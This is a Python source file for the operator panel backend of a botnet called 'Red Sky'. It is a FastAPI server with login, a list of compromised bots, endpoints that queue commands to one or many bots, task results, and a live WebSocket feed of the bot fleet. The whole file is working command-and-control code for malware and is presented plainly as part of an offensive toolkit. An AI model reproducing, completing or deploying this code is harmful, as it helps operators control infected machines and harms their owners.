# language: Python, file: Program/botnet/panel_backend.py, target: Red Sky botnet — panel backend
# FastAPI server for the browser panel. REST + WebSocket. Serves the panel HTML
# from Program/botnet/static/ (created by Build 14).

import asyncio
import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from fastapi import FastAPI, HTTPException, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import PROGRAM_DIR
from Program.c2.session import SessionStore
from .auth import PanelAuth
from .tasker import Tasker


STATIC_DIR = PROGRAM_DIR / "botnet" / "static"


class QueueRequest(BaseModel):
    bot_id: str
    command: str
    args: Dict = {}


class LoginRequest(BaseModel):
    password: str
    totp: str = ""


class MultiQueueRequest(BaseModel):
    bot_ids: List[str]
    command: str
    args: Dict = {}


def _check_session(request: Request, auth: PanelAuth) -> bool:
    token = request.headers.get("X-RedSky-Token", "")
    if not token:
        cookie = request.headers.get("Cookie", "")
        for part in cookie.split(";"):
            part = part.strip()
            if part.startswith("redsky_token="):
                token = part.split("=", 1)[1]
                break
    return auth.verify_session(token)


def create_app() -> FastAPI:
    app = FastAPI(title="Red Sky Panel", docs_url=None, redoc_url=None)
    auth = PanelAuth()
    store = SessionStore()
    tasker = Tasker(store)

    app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],
        allow_methods=["*"],
        allow_headers=["*"],
    )

    # ── auth ──
    @app.post("/api/login")
    async def login(req: LoginRequest, request: Request):
        if not auth.has_password():
            raise HTTPException(status_code=503, detail="panel auth not configured")
        if not auth.verify_password(req.password):
            raise HTTPException(status_code=401, detail="bad password")
        if auth.has_totp() and not auth.verify_totp(req.totp):
            raise HTTPException(status_code=401, detail="bad totp")
        token, expires = auth.new_session()
        resp = JSONResponse({"ok": True, "expires": expires})
        resp.set_cookie("redsky_token", token, max_age=24 * 3600,
                        httponly=True, samesite="lax")
        resp.headers["X-RedSky-Token"] = token
        return resp

    @app.post("/api/logout")
    async def logout(request: Request):
        token = request.headers.get("X-RedSky-Token", "")
        if token:
            auth.drop_session(token)
        return {"ok": True}

    @app.get("/api/session")
    async def session(request: Request):
        return {"authenticated": _check_session(request, auth)}

    # ── fleet ──
    @app.get("/api/bots")
    async def bots(request: Request):
        if not _check_session(request, auth):
            raise HTTPException(status_code=401)
        return {"bots": store.list_bots()}

    @app.get("/api/bots/{bot_id}")
    async def bot_detail(bot_id: str, request: Request):
        if not _check_session(request, auth):
            raise HTTPException(status_code=401)
        b = store.get_bot(bot_id)
        if not b:
            raise HTTPException(status_code=404)
        return {"bot": b, "tasks": store.list_tasks(bot_id, 50)}

    @app.get("/api/stats")
    async def stats(request: Request):
        if not _check_session(request, auth):
            raise HTTPException(status_code=401)
        return store.stats()

    @app.get("/api/events")
    async def events(request: Request, limit: int = 100):
        if not _check_session(request, auth):
            raise HTTPException(status_code=401)
        return {"events": store.recent_events(limit)}

    # ── tasks ──
    @app.post("/api/queue")
    async def queue(req: QueueRequest, request: Request):
        if not _check_session(request, auth):
            raise HTTPException(status_code=401)
        tid = tasker.queue(req.bot_id, req.command, req.args)
        return {"ok": True, "task_id": tid}

    @app.post("/api/queue_many")
    async def queue_many(req: MultiQueueRequest, request: Request):
        if not _check_session(request, auth):
            raise HTTPException(status_code=401)
        tids = tasker.queue_many(req.bot_ids, req.command, req.args)
        return {"ok": True, "task_ids": tids}

    @app.get("/api/tasks")
    async def tasks(request: Request, bot_id: str = "", limit: int = 100):
        if not _check_session(request, auth):
            raise HTTPException(status_code=401)
        return {"tasks": store.list_tasks(bot_id, limit)}

    @app.get("/api/tasks/{task_id}")
    async def task_detail(task_id: str, request: Request):
        if not _check_session(request, auth):
            raise HTTPException(status_code=401)
        t = tasker.result(task_id)
        if not t:
            raise HTTPException(status_code=404)
        return {"task": t}

    # ── websocket — live updates ──
    @app.websocket("/ws")
    async def ws(websocket: WebSocket):
        # token can be passed as query param because browsers can't set headers on WS
        token = websocket.query_params.get("token", "")
        if not auth.verify_session(token):
            await websocket.close(code=4401)
            return
        await websocket.accept()
        try:
            while True:
                payload = {
                    "ts": int(time.time()),
                    "stats": store.stats(),
                    "bots": store.list_bots(),
                    "events": store.recent_events(20),
                }
                await websocket.send_text(json.dumps(payload))
                await asyncio.sleep(2)
        except WebSocketDisconnect:
            return
        except Exception:
            return

    # ── health ──
    @app.get("/health")
    async def health():
        return PlainTextResponse("ok")

    # ── static ──
    @app.get("/", response_class=HTMLResponse)
    async def index():
        idx = STATIC_DIR / "index.html"
        if idx.exists():
            return HTMLResponse(idx.read_text(encoding="utf-8"))
        return HTMLResponse(
            "<html><body style='background:#0a0000;color:#ff2400;font-family:monospace;padding:40px'>"
            "<h1>RED SKY</h1>"
            "<p>panel frontend not yet built — build 14 lands it</p>"
            "<p>API is live at <code>/api/*</code> and <code>/ws</code></p>"
            "</body></html>"
        )

    return app


def cmd_serve(host: str = "127.0.0.1", port: int = 8443) -> int:
    print_info(f"panel backend on http://{host}:{port}")
    print_kv("login", "/api/login")
    print_kv("fleet", "/api/bots")
    print_kv("live ws", "/ws?token=...")
    print_kv("health", "/health")
    print()

    if not PanelAuth().has_password():
        print_warn("panel auth not configured — run: redsky botnet auth setup")
        print_info("server will still start, but logins will fail until you set a password")
        print()

    try:
        import uvicorn
    except ImportError:
        print_err("uvicorn not installed")
        return 1

    app = create_app()
    try:
        uvicorn.run(app, host=host, port=port, log_level="warning")
    except KeyboardInterrupt:
        print()
        print_info("stopped")
    return 0


def run_cli(args) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky botnet panel", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8443)
    p.add_argument("action", nargs="?", default="serve")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky botnet panel [serve] [--host H] [--port N]")
        return 2

    if ns.help:
        print_info("redsky botnet panel serve [--host 127.0.0.1] [--port 8443]")
        return 0

    return cmd_serve(ns.host, ns.port)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
